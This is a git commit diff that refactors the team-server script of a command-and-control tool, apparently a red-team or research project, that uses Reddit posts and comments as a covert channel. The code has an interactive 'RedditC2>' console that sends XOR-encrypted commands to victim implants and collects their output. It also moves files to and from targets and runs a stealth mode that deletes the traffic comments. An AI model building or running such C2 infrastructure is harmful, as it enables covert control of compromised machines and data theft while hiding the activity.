6d5b0306f96f1ea8c461e833e8cab75da4e72bcb
Tom D'Aquino <tdaquino@vectra.ai>
2023-01-17 01:46:39 -0800

    Refactoring to use classes that track commands/responses by comment ID

--- TeamServer/teamserver.py
+++ TeamServer/teamserver.py
@@ -1,6 +1,4 @@
 import praw
-import random
-import string
 import time
 import os
 import json
@@ -35,111 +33,106 @@ def encode_file_in_base64(filepath):
         file_data = file.read()
     return base64.b64encode(file_data).decode('utf-8')
 
-#list all listeners (all post titles in a specific Subreddit)
-def listListeners(subreddit_name):
-    subreddit = reddit.subreddit(subreddit_name)
+class TeamServer:
 
-    # Print the titles of all posts
-    for post in subreddit.hot(limit=None):
-        print("[*] " + post.title)
-	
-#post into the subreddit
-def createPost(subreddit_name, title):
-    postContent = "" #add a post content if you don't want to leave the post body empty
-    # get subreddit
-    subreddit = reddit.subreddit(subreddit_name)
-    #create a post
-    subreddit.submit(title,selftext=postContent)
+    def __init__(self, client_id, client_secret, username, password, user_agent, stealth_mode, xor_key):
+        self.client_id = client_id
+        self.client_secret = client_secret
+        self.username = username
+        self.password = password
+        self.user_agent = user_agent
+        self.stealth_mode = stealth_mode
+        self.xor_key = xor_key
+        self.subreddit_name = None
+        self.listener_name = None
+        self.submission = None
+        self.comment_id = None
+        self.__reddit = None
+        self.__subreddit = None
 
-def verifySession(subreddit_name, listenerID):
-    value = True
-    for submission in reddit.subreddit(subreddit_name).top('all'):
-        if(submission.title == listenerID):
-            value = True
-            break
-        else:
-            value = False
-    return value
-    
-def sub_exists(sub):
-    exists = True
-    try:
-        reddit.subreddits.search_by_name(sub, exact=True)
-    except NotFound:
-        exists = False
-    return exists
+    @property
+    # creating an authorized reddit instance
+    def reddit(self):
+        if self.__reddit is None:
+            self.__reddit = praw.Reddit(
+                client_id = self.client_id,
+                client_secret = self.client_secret,
+                username = self.username,
+                password = self.password,
+                user_agent = self.user_agent
+                )
+            self.__reddit.validate_on_submit = True
+        return self.__reddit
 
-#delete all the comments in a subreddit post, leaving no trace
-def deleteComments(subreddit_name, title):
-    subreddit = reddit.subreddit(subreddit_name)
-    resp = subreddit.search(title,limit=10)
-    
-    for submission in resp:        
-        submission.comments.replace_more(limit=None)
-        for comment in submission.comments:
-            if("executed" in comment.body):
-                #delete the replies (victim's posts)
-                for outputTask in comment.replies:
-                    outputTask.delete()
-                #delete the replies (attacker's posts)
-                comment.delete()
-            else:
-                pass
-            
-    print("[+] Comments got deleted")
+    @property
+    def subreddit(self):
+        if self.__subreddit is None:
+            self.__subreddit = self.reddit.subreddit(self.subreddit_name)
+        return self.__subreddit
 
-
-#read a post with a specific title
-def readOutput(subreddit_name, title, command):
-    victim_responses = []
-    subreddit = reddit.subreddit(subreddit_name)
-    resp = subreddit.search(title,limit=10)
-
-    for submission in resp:        
-        #look only for comments which has our command in it
-        submission.comments.replace_more(limit=None)
-        for top_level_comment in submission.comments:
-            if(command in top_level_comment.body):
-                #ignore the already executed commands
-                if top_level_comment.body == "executed":
-                    pass
-                    
-                #now read the below comment, which is the output result
-                else:                    
-                    for outputTask in top_level_comment.replies:
-                        victim_responses.append(outputTask.body)
-                        
-                    #only edit the reply to "executed" if it has replies in it
-                    if (top_level_comment.replies):
-                        top_level_comment.edit("executed")
+    #list all listeners (all post titles in a specific Subreddit)
+    def listListeners(self):
+        # Print the titles of all posts
+        for post in self.subreddit.hot(limit=None):
+            print("[*] " + post.title)
         
-        #use recursion when no new reply is found
-        if not victim_responses:
-            #print("[!] No response, waiting for 5 seconds")
-            #time.sleep(5)
-            return readOutput(subreddit_name, title, command)
-        
-        else:
-            response = victim_responses[0]
-            response = response[7:]
-            response = response[:-1]
-            
-            #decode and decrypt the message
-            decipher = decrypt(str(response), xor_key)
-            
-            if("download" in decipher):
-                pass
-            else:
-                print("[+] Received Output:\n" + str(decipher))
-            
-    return str(decipher)
+    #post into the subreddit
+    def createPost(self):
+        postContent = "" #add a post content if you don't want to leave the post body empty
+        #create a post
+        self.subreddit.submit(self.listener_name, selftext=postContent)
 
-def sendCommand(subreddit_name, title, command):
-    subreddit = reddit.subreddit(subreddit_name)
-    resp = subreddit.search(title,limit=10)
-    
-    for submission in resp:
-        submission.reply("in: " + command)
+    def verifySession(self):
+        for submission in self.subreddit.top(time_filter='all'):
+            if(submission.title == self.listener_name):
+                self.submission = submission
+        return self.submission
+        
+    def sub_exists(self):
+        exists = True
+        try:
+            self.reddit.subreddits.search_by_name(self.subreddit_name, exact=True)
+        except NotFound:
+            exists = False
+        return exists
+
+    #read a post with a specific title
+    def readOutput(self):
+        victim_responses = []
+        #get comment based on comment_id from last sent command
+        comment = self.reddit.comment(self.comment_id)
+
+        #wait for comment to get a reply
+        replies = None
+        while not victim_responses:
+            time.sleep(5)
+            comment.refresh()
+            replies = comment.replies
+
+            for reply in replies:        
+                #look only for comments which have output to our command in it
+                if('out:' in reply.body):
+                    #now read the below comment, which is the output result and delete it if stealth mode is on               
+                    victim_responses.append(reply.body)
+                    if self.stealth_mode == "1":
+                        reply.delete()
+
+        response = victim_responses[0]
+        response = response[7:]
+        response = response[:-1]
+        
+        #decode and decrypt the message
+        decipher = decrypt(str(response), self.xor_key)
+        
+        print("[+] Received Output:\n" + str(decipher))
+
+        #delete original command comment if stealth_mode is on
+        if self.stealth_mode == "1":
+            comment.delete()
+
+    def sendCommand(self, command):
+        command = self.submission.reply("in: " + command)
+        self.comment_id = command.id
         
 
 if __name__ == "__main__":
@@ -157,71 +150,61 @@ if __name__ == "__main__":
     user_agent = data['user_agent']
     stealth_mode = data['stealth_mode']
     xor_key = data['xor_key']
-    #-------------
-    subreddit_name = ""
-    #-------------
 
-    # creating an authorized reddit instance
-    reddit = praw.Reddit(client_id = client_id,
-                     client_secret = client_secret,
-                     username = username,
-                     password = password,
-                     user_agent = user_agent)
-                     
-    reddit.validate_on_submit = True
+    t = TeamServer(client_id, client_secret, username, password, user_agent, stealth_mode, xor_key)
     
     while True:
         command = input("RedditC2> ")
         if command[:13] == "set subreddit":
             #validate the subreddit
-            if(sub_exists(command[14:])):
+            t.subreddit_name = command[14:]
+            if t.sub_exists():
                 print("[*] Subreddit set to: " + command[14:])
-                subreddit_name = command[14:]
             else:
+                t.subreddit_name = None
                 print("[-] The selected subreddit doesn't exist or doesn't have propper permissions. Try again with another subreddit.")
 
         #list all listeners the operator can use
         elif command[:14] == "list listeners":
-            if(subreddit_name == ""):
-                print("[!] Put the value of subreddit")
+            if t.subreddit_name is None:
+                print("[!] Use the 'set subreddit' command first.")
             else:
-                listListeners(subreddit_name)
+                t.listListeners()
 
         #careful, only execute this once
         elif command[:15] == "create listener":
-            listener_id = command[16:]
-            if(subreddit_name == ""):
-                print("[!] Put the value of subreddit")
+            listener_name = command[16:]
+            if t.subreddit_name is None:
+                print("[!] Use the 'set subreddit' command first.")
             else:
-                createPost(subreddit_name, listener_id)
+                t.listener_name = listener_name
+                t.createPost()
                 print("[+] Listener created")
 
         elif command[:12] == "use listener":
-            if(subreddit_name == ""):
-                print("[!] Put the value of subreddit")
+            if t.subreddit_name is None:
+                print("[!] Use the 'set subreddit' command first.")
             else:
-                selected_listener = command[13:]
-                if(verifySession(subreddit_name, selected_listener)):
+                t.listener_name = command[13:]
+                listener_session = t.verifySession()
+                if listener_session:
                     print("[+] Entered the session")
 
                     while True:
-                        session_command = input(selected_listener + "> ")
+                        session_command = input(t.listener_name + "> ")
 
                         #------------------------ ALL AGENT FEATURES START HERE ------------------------
                         if(session_command == "exit"):
-                            deleteConfirm = input("[?] Do you want to delete all the C2 traffic logs stored in Reddit before exiting? [Y/n]: ")
-                            if(deleteConfirm == "y" or deleteConfirm == "Y"):
-                                print("[*] Deleting comments...")
-                                deleteComments(subreddit_name, selected_listener)
-                                break
-                            else:
-                                break
-                    
+                            break
+
                         elif(session_command == "clear"):
                             if (hostOS == "Linux"):
                                 os.system('clear')
                             elif (hostOS == "Windows"):
                                 os.system('cls')
+                        
+                        elif session_command == '':
+                            pass
                     
                         else:
                             if(session_command[:8] == "download"):
@@ -235,18 +218,15 @@ if __name__ == "__main__":
                                     break
                                 else:
                                     print("[+] Uploading " + filename + " to the target")
-                                
                             
                             final_message = encrypt(session_command, xor_key)
                                           
                             #send the command
-                            sendCommand(subreddit_name, selected_listener, str(final_message))
+                            t.sendCommand(str(final_message))
                             print("[+] Command sent")
-                            #then read the output
-                            #time.sleep(1) #give time for reddit to update
                             
                             if(session_command[:8] == "download"):
-                                fileContent = readOutput(subreddit_name, selected_listener, str(final_message))
+                                fileContent = t.readOutput()
                                 if("File is too large" in fileContent):
                                     pass
                                 else:
@@ -254,16 +234,7 @@ if __name__ == "__main__":
                                     print("[+] File saved as " + filename)
                                 
                             else:
-                                readOutput(subreddit_name, selected_listener, str(final_message))
-                            
-                            
-                            #delete the comments if stealth_mode is set to 1 in config.json
-                            if(stealth_mode == "1"):
-                                deleteComments(subreddit_name, selected_listener)
-                            else:
-                                pass
-                                
-                                
+                                t.readOutput()
                         #------------------------ AGENT FEATURES END HERE ------------------------
                 else:
                     print("[!] Could not enter the session")
@@ -281,10 +252,10 @@ if __name__ == "__main__":
 
         elif command == 'help':
             print("""
-set subreddit                    --> Select the subreddit where you will create the listener
+set subreddit [subreddit_name]   --> Select the subreddit where you will create the listener
 list listeners                   --> List all listeners you can use within the subreddit
-create listener [session number] --> Create a post in subreddit where the traffic will ocurr
-use listener [session number]    --> Interact With Each Session Individually
+create listener [listener_name]  --> Create a post in subreddit where the traffic will ocurr
+use listener [listener_name]     --> Interact With Each Session Individually
 run [command]                    --> Execute a cmd command
 download [file_name]             --> Download a file from the target
 upload [file_name]               --> Upload a file to the target
@@ -293,6 +264,9 @@ help                             --> Show the help menu
 exit                             --> Exit from the session
 clear                            --> Clear the screen
                 """)
+
+        elif command == '':
+            pass
 
         else:
             print("[-] Command Not Found")
